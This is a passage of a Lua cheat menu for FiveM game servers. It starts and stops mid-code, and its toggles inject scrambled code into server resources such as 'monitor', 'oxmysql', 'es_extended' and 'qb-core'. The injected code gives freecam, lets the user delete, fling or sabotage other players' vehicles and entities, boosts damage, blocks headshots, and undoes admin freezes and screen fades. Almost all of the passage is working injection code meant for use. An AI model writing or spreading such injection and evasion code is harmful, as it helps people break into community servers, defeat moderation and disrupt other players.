                            pos = pos + vector3(0.0, 0.0, speed)
                        end
                        if TyUiOpAsDfGhJk(0, 36) then
                            pos = pos - vector3(0.0, 0.0, speed)
                        end

                        WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                        PlMnBvCxZaSdFg(ent, head)
                    end
                end
                YtReWqAzXsEdCv = false
            end)
        end

        KUQpH7owdz()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        NpYgTbUcXsRoVm = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Free Camera", function()
    MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
        
        g_FreecamFeatureEnabled = true
        
        local function initializeFreecam()
            -- Script State
            local isFreecamActive = false
            local freecamHandle = nil
            local targetCoords, targetEntity = nil, nil
            local currentFeatureIndex = 1

            -- NEW FEATURE: Ped Spawning State
            local pedsToSpawn = { "s_m_m_movalien_01", "u_m_y_zombie_01", "s_m_y_blackops_01", "csb_abigail", "a_c_coyote" }
            local currentPedIndex = 1

            local stopFreecam, startFreecam

            -- Feature Definitions (Now with Ped Spawner)
            local Features = { 
                "Look-Around", 
                "Spawn Ped",         -- ADDED
                "Teleport", 
                "Delete Entity", 
                "Fling Entity", 
                "Flip Vehicle", 
                "Launch Vehicle",
                "Teleport Vehicle",
                "Mess With Vehicle"
            }

            -- Helper Function for Drawing Text
            local function drawText(content, x, y, options)
                SetTextFont(options.font or 4)
                SetTextScale(0.0, options.scale or 0.3)
                SetTextColour(options.color[1], options.color[2], options.color[3], options.color[4])
                SetTextOutline()
                if options.shadow then SetTextDropShadow(2, 0, 0, 0, 255) end
                SetTextCentre(true)
                BeginTextCommandDisplayText("STRING")
                AddTextComponentSubstringPlayerName(content)
                EndTextCommandDisplayText(x, y)
            end

            -- Main Draw Thread (UI Only)
            local function drawThread()
                while isFreecamActive do
                    Wait(0)
                    -- Draw Crosshair
                    drawText("•", 0.5, 0.485, {font = 4, scale = 0.5, color = {255,255,255,200}})
                    
                    -- ##### UI FIX: SCROLLING MENU LOGIC #####
                    local ui = { x = 0.5, y = 0.75, lineHeight = 0.03, maxVisible = 7, colors = { text = {245, 245, 245, 120}, selected = {52, 152, 219, 255} } }
                    local numFeatures = #Features
                    local startIdx, endIdx = 1, numFeatures

                    if numFeatures > ui.maxVisible then
                        startIdx = math.max(1, currentFeatureIndex - math.floor(ui.maxVisible / 2))
                        endIdx = math.min(numFeatures, startIdx + ui.maxVisible - 1)
                        if endIdx == numFeatures then
                            startIdx = numFeatures - ui.maxVisible + 1
                        end
                    end

                    -- Draw a counter above the list
                    drawText(("%d/%d"):format(currentFeatureIndex, numFeatures), ui.x, ui.y - 0.035, {scale = 0.25, color = {255,255,255,120}})

                    local displayCount = 0
                    for i = startIdx, endIdx do
                        local featureName = Features[i]
                        local isSelected = (i == currentFeatureIndex)
                        local lineY = ui.y + (displayCount * ui.lineHeight)
                        if isSelected then
                            drawText(("[ %s ]"):format(featureName), ui.x, lineY, {scale = 0.32, color = ui.colors.selected, shadow = true})
                        else
                            drawText(featureName, ui.x, lineY, {scale = 0.28, color = ui.colors.text})
                        end
                        displayCount = displayCount + 1
                    end
                end
            end

            -- Main Input and Logic Thread
            local function logicThread()
                while isFreecamActive do
                    Wait(0)
                    if IsDisabledControlJustPressed(0, 241) then currentFeatureIndex = (currentFeatureIndex - 2 + #Features) % #Features + 1 elseif IsDisabledControlJustPressed(0, 242) then currentFeatureIndex = (currentFeatureIndex % #Features) + 1 end
                    
                    if IsDisabledControlJustPressed(0, 24) then -- Action Key Pressed
                        local currentFeature = Features[currentFeatureIndex]
                        if currentFeature == "Teleport" and targetCoords then
                            local ped = PlayerPedId()
                            local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, false)
                            SetEntityCoords(ped, targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z, false, false, false, true)
                        -- ##### NEW FEATURE: SAFE PED SPAWNER LOGIC #####
                        elseif currentFeature == "Spawn Ped" and targetCoords then
                            local model = pedsToSpawn[currentPedIndex]
                            CreateThread(function()
                                local modelHash = GetHashKey(model)
                                RequestModel(modelHash)
                                local timeout = 2000 -- 2 second timeout for model loading
                                while not HasModelLoaded(modelHash) and timeout > 0 do
                                    Wait(100)
                                    timeout = timeout - 100
                                end
                                if HasModelLoaded(modelHash) then
                                    local _, z = GetGroundZFor_3dCoord(targetCoords.x, targetCoords.y, targetCoords.z, false)
                                    local spawnPos = vector3(targetCoords.x, targetCoords.y, z and z + 1.0 or targetCoords.z)
                                    local newPed = CreatePed(4, modelHash, spawnPos.x, spawnPos.y, spawnPos.z, 0.0, true, true)
                                    SetModelAsNoLongerNeeded(modelHash)
                                    TaskStandStill(newPed, -1) -- Make them stand still
                                    currentPedIndex = (currentPedIndex % #pedsToSpawn) + 1 -- Cycle to the next ped for next time
                                end
                            end)
                        elseif currentFeature == "Delete Entity" and targetEntity and DoesEntityExist(targetEntity) then
                            SetEntityAsMissionEntity(targetEntity, true, true)
                            DeleteEntity(targetEntity)
                        elseif currentFeature == "Fling Entity" and targetEntity and (IsEntityAPed(targetEntity) or IsEntityAVehicle(targetEntity)) then
                            ApplyForceToEntity(targetEntity, 1, math.random(-50.0, 50.0), math.random(-50.0, 50.0), 50.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Flip Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            SetVehicleOnGroundProperly(targetEntity)
                        elseif currentFeature == "Launch Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            ApplyForceToEntity(targetEntity, 1, 0.0, 0.0, 100.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                        elseif currentFeature == "Teleport Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local currentCoords = GetEntityCoords(targetEntity)
                            local newCoords = currentCoords + GetEntityForwardVector(targetEntity) * 5.0 + vector3(0.0, 0.0, 50.0)
                            SetEntityCoords(targetEntity, newCoords.x, newCoords.y, newCoords.z, false, false, false, true)
                        elseif currentFeature == "Mess With Vehicle" and targetEntity and IsEntityAVehicle(targetEntity) then
                            local actions = {
                                function(veh) SetVehicleTyreBurst(veh, math.random(0, 5), false, 1000.0) end,
                                function(veh) SetVehicleDoorOpen(veh, math.random(0, 5), false, false) end,
                                function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                            }
                            local randomAction = actions[math.random(#actions)]
                            randomAction(targetEntity)
                        end
                    end
                end
            end

            -- Main Camera Movement Thread (Unchanged)
            local function cameraThread()
                local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                while isFreecamActive do
                    Wait(0)
                    local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                    local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                    if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                    local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                    SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                end
            end
            
            startFreecam = function()
                if isFreecamActive then return end
                isFreecamActive = true
                local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                
                if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                RenderScriptCams(true, false, 0, true, true)
                SetCamActive(freecamHandle, true)
                CreateThread(drawThread)
                CreateThread(logicThread)
                CreateThread(cameraThread)
            end

            stopFreecam = function()
                if not isFreecamActive then return end
                isFreecamActive = false
                if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                freecamHandle = nil
            end
            
            CreateThread(function()
                while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                    if IsDisabledControlJustPressed(0, 74) then -- H key
                        if isFreecamActive then stopFreecam()
                        else startFreecam() end
                    end
                end
            end)
        end
        
        initializeFreecam()
    ]])
end, function()
    MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
        g_FreecamFeatureEnabled = false
        if isFreecamActive and stopFreecam then stopFreecam() end
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Super Jump", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
        xCvBnMqWeRtYuIo = true

        local function JcWT5vYEq1()
            local yLkPwOiUtReAzXc = CreateThread
            yLkPwOiUtReAzXc(function()
                while xCvBnMqWeRtYuIo and not Unloaded do
                    local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                    local eRtYuIoPaSdFgHj = PlayerPedId()
                    local oPlMnBvCxZlKjHg = PlayerId()

                    hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                    Wait(0)
                end
            end)
        end

        JcWT5vYEq1()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        xCvBnMqWeRtYuIo = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Levitation", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        -- make helpers global so other chunks can use them
        function ScaleVector(vect, mult)
            return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
        end

        function AddVectors(vect1, vect2)
            return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
        end

        function ApplyForce(entity, direction)
            local XroXTNEFqxoWfH = ApplyForceToEntity
            XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
        end

        function SubVectors(vect1, vect2)
            return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
        end

        function Oscillate(entity, position, angleFreq, dampRatio)
            local OBaTQqteIpmZVo = GetEntityVelocity
            local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
            local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
            local targetPos = SubVectors(pos1, pos2)
            ApplyForce(entity, targetPos)
        end

        function RotationToDirection(rot)
            local radZ = math.rad(rot.z)
            local radX = math.rad(rot.x)
            local cosX = math.cos(radX)
            return vector3(
                -math.sin(radZ) * cosX,
                math.cos(radZ) * cosX,
                math.sin(radX)
            )
        end

        function GetClosestCoordOnLine(startCoords, endCoords, entity)
            local CDGcdMQhosGVCf = GetShapeTestResult
            local UaWIFHgeizhHua = StartShapeTestRay
            local result, hit, hitCoords, surfaceNormal, entityHit =
                CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
            return hit == 1, hitCoords
        end

        function GetCameraLookingAtCoord(distance)
            local playerPed = PlayerPedId()
            local camRot = GetGameplayCamRot(2)
            local camCoord = GetGameplayCamCoord()
            local forwardVector = RotationToDirection(camRot)
            local destination = vector3(
                camCoord.x + forwardVector.x * distance,
                camCoord.y + forwardVector.y * distance,
                camCoord.z + forwardVector.z * distance
            )
            local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
            if hit then return endCoords else return destination end
        end
    ]])

    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function awfjawr57awt7f()
            nxtBFlQWMMeRLs = true

            local jIiIfikctHYrlH = CreateThread
            jIiIfikctHYrlH(function()
                while nxtBFlQWMMeRLs and not Unloaded do
                    Wait(0)
                    local ped = PlayerPedId()

                    local SZxuJlyJQmGlZz = SetPedCanRagdoll
                    local valuOZfymjeVaH = IsEntityPlayingAnim
                    local IiHiLVRagMQhrn = RequestAnimDict
                    local mOZOquvggdnbod = HasAnimDictLoaded
                    local UFZdrZNXpLwpjT = TaskPlayAnim
                    local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                    local OyvuuAMyvjtIzD = GetGameplayCamRot
                    local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                    while XKWvPIkCKMXIfR(0, 22) do
                        SZxuJlyJQmGlZz(ped, false)

                        if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                            IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                            while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                Wait(0)
                            end
                            UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                8.0, -8.0, -1, 49, 0, false, false, false)
                        end

                        local camRot = OyvuuAMyvjtIzD(2)
                        local camHeading = (camRot.z + 360) % 360
                        local direction = cQPIZtKyyWaVcY(77)

                        SetEntityHeading(ped, camHeading)
                        Oscillate(ped, direction, 0.33, 0.9)

                        Wait(1)
                    end

                    if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                        ClearPedTasks(ped)
                    end

                    SZxuJlyJQmGlZz(ped, true)
                end
            end)
        end

        awfjawr57awt7f()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        nxtBFlQWMMeRLs = false
        ClearPedTasks(PlayerPedId())
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Super Strength", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
        fgawjFmaDjdALaO = true

        local holdingEntity = false
        local holdingCarEntity = false
        local holdingPed = false
        local heldEntity = nil
        local entityType = nil
        local awfhjawrasfs = CreateThread

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                if holdingEntity and heldEntity then
                    local playerPed = PlayerPedId()
                    local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                    DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                    
                    if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                        RequestAnimDict('anim@mp_rollarcoaster')
                        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                    elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                        RequestAnimDict('anim@heists@box_carry@')
                        while not HasAnimDictLoaded('anim@heists@box_carry@') do
                            Wait(100)
                        end
                        TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                    end

                    if not IsEntityAttached(heldEntity) then
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                    end
                end
            end
        end)

        awfhjawrasfs(function()
            while fgawjFmaDjdALaO and not Unloaded do
                Wait(0)
                local playerPed = PlayerPedId()
                local camPos = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)
                local direction = RotationToDirection(camRot)
                local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                local validTarget = false

                if hit == 1 then
                    entityType = GetEntityType(entityHit)
                    if entityType == 3 or entityType == 2 or entityType == 1 then
                        validTarget = true
                        local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                        DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                    end
                end

                if IsDisabledControlJustReleased(0, 38) then
                    if validTarget and not holdingEntity then
                        holdingEntity = true
                        heldEntity = entityHit

                        local wfuawruawts = AttachEntityToEntity

                        if entityType == 3 then
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                        elseif entityType == 2 then
                            holdingCarEntity = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        elseif entityType == 1 then
                            holdingPed = true
                            wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                        end
                    end
                elseif IsDisabledControlJustReleased(0, 246) then
                    if holdingEntity then
                        local wgfawhtawrs = DetachEntity
                        local dfgjsdfuwer = ApplyForceToEntity
                        local sdgfhjwserw = ClearPedTasks

                        wgfawhtawrs(heldEntity, true, true)
                        dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        holdingEntity = false
                        holdingCarEntity = false
                        holdingPed = false
                        heldEntity = nil
                        sdgfhjwserw(PlayerPedId())
                    end
                end
            end
        end)

        function RotationToDirection(rotation)
            local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
            local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
            return direction
        end

        function DrawText3Ds(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
            local px, py, pz = table.unpack(GetGameplayCamCoords())
            local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
            local fov = (1 / GetGameplayCamFov()) * 100
            scale = scale * fov

            if onScreen then
                SetTextScale(0.0 * scale, 0.35 * scale)
                SetTextFont(0)
                SetTextProportional(1)
                SetTextColour(255, 255, 255, 215)
                SetTextDropshadow(0, 0, 0, 0, 155)
                SetTextEdge(2, 0, 0, 0, 150)
                SetTextDropShadow()
                -- SetTextOutline()
                SetTextEntry("STRING")
                SetTextCentre(1)
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        fgawjFmaDjdALaO = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Super Punch", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
        qWeRtYuIoPlMnBv = true

        local function NdaFBuHkvo()
            local uTrEsAzXcVbNmQw = CreateThread
            uTrEsAzXcVbNmQw(function()
                while qWeRtYuIoPlMnBv and not Unloaded do
                    local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                    local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                    local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                    local sDfGhJkLqWeRtYu = PlayerId()
                    local DamageRateValue = 150.0
                    local WeaponNameForDamage = "WEAPON_UNARMED"


                    nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                    cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                    bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                    Wait(0)
                end
            end)
        end

        NdaFBuHkvo()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local qWeRtYuIoPlMnBv = false
        local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
        local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
        local bNmQwErTyUiOpAs = SetWeaponDamageModifier
        local sDfGhJkLqWeRtYu = PlayerId()

        nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
        cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
        bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Throw From Vehicle", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
        zXpQwErTyUiPlMn = true

        local function qXzRP7ytKW()
            local iLkMzXvBnQwSaTr = CreateThread
            iLkMzXvBnQwSaTr(function()
                while zXpQwErTyUiPlMn and not Unloaded do
                    local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                    vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                    Wait(0)
                end
            end)
        end

        qXzRP7ytKW()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        zXpQwErTyUiPlMn = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Force Third Person", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
        kJfGhTrEeWqAsDz = true

        local function pqkTRWZ38y()
            local gKdNqLpYxMiV = CreateThread
            gKdNqLpYxMiV(function()
                while kJfGhTrEeWqAsDz and not Unloaded do
                    local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                    local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                    qWeRtYuIoPlMnBv(0)
                    aSdFgHjKlQwErTy(0)
                    Wait(0)
                end
            end)
        end

        pqkTRWZ38y()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        kJfGhTrEeWqAsDz = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Force Driveby", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function UEvLBcXqM6()
            local cVbNmAsDfGhJkLz = CreateThread
            cVbNmAsDfGhJkLz(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                    local eRtYuIoPaSdFgHi = PlayerPedId()

                    lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                    Wait(0)
                end
            end)
        end

        UEvLBcXqM6()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        zXcVbNmQwErTyUi = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Headshot", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
        yHnvrVNkoOvGMWiS = true

        local eeitKYqDwYbPslTW = CreateThread
        local function LIfbdMbeIAeHTnnx()
            eeitKYqDwYbPslTW(function()
                while yHnvrVNkoOvGMWiS and not Unloaded do
                    local fhw72q35d8sfj = SetPedSuffersCriticalHits
                    fhw72q35d8sfj(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        end

        LIfbdMbeIAeHTnnx()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        yHnvrVNkoOvGMWiS = false
        fhw72q35d8sfj(PlayerPedId(), true)
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Freeze", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
        nHgFdSaZxCvBnMq = true

        local sdfw3w3tsdg = CreateThread
        local function XELa6FJtsB()
            sdfw3w3tsdg(function()
                while nHgFdSaZxCvBnMq and not Unloaded do
                    local fhw72q35d8sfj = FreezeEntityPosition
                    local segfhs347dsgf = ClearPedTasks

                    if IsEntityPositionFrozen(PlayerPedId()) then
                        fhw72q35d8sfj(PlayerPedId(), false)
                        segfhs347dsgf(PlayerPedId())
                    end
                    
                    Wait(0)
                end
            end)
        end

        XELa6FJtsB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        nHgFdSaZxCvBnMq = false
    ]])
end)

MachoMenuCheckbox(PlayerTabSections[1], "Anti-Blackscreen", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
        aDjsfmansdjwAEl = true

        local sdfw3w3tsdg = CreateThread
        local function XELWAEDa6FJtsB()
            sdfw3w3tsdg(function()
                while aDjsfmansdjwAEl and not Unloaded do
                    DoScreenFadeIn(0)
                    Wait(0)
                end
            end)
        end

        XELWAEDa6FJtsB()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        aDjsfmansdjwAEl = false
    ]])
end)

local ModelNameHandle = MachoMenuInputbox(PlayerTabSections[2], "Model Name:", "...")

MachoMenuButton(PlayerTabSections[2], "Change Model", function()
    local ModelName = MachoMenuGetInputbox(ModelNameHandle)

    if type(ModelName) == "string" and ModelName ~= "" then
        local Code = string.format([[
            local function GykR8qjWTp()
                local nHgFdSaZxCvBnMq = RequestModel
                local xCvBnMqWeRtYuIo = HasModelLoaded
                local aSdFgHjKlQwErTy = SetPlayerModel
                local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                nHgFdSaZxCvBnMq(GetHashKey("%s"))
                while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                    Wait(1)
                end
                
                aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                oPlMnBvCxZlKjHg(PlayerPedId())
            end

            GykR8qjWTp()
        ]], ModelName, ModelName, ModelName)

        MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", Code)
    end
end)

MachoMenuButton(PlayerTabSections[2], "White Fodo Drip", function()
    function WhiteFodoDrip()
        local ped = PlayerPedId()

        -- Jacket
        SetPedComponentVariation(ped, 11, 109, 0, 2)
        -- Shirt/Undershirt
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        -- Hands
        SetPedComponentVariation(ped, 3, 5, 0, 2)
        -- Legs
        SetPedComponentVariation(ped, 4, 56, 0, 2)
        -- Shoes
        SetPedComponentVariation(ped, 6, 19, 0, 2)
        -- Hat
        SetPedPropIndex(ped, 0, 1, 0, true)
    end

    WhiteFodoDrip()
end)

MachoMenuButton(PlayerTabSections[2], "Fodo Mafia Drip", function()
    function FodoMafia()
        local ped = PlayerPedId()

        -- Jacket
        SetPedComponentVariation(ped, 11, 5, 0, 2)
        -- Shirt/Undershirt
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        -- Hands
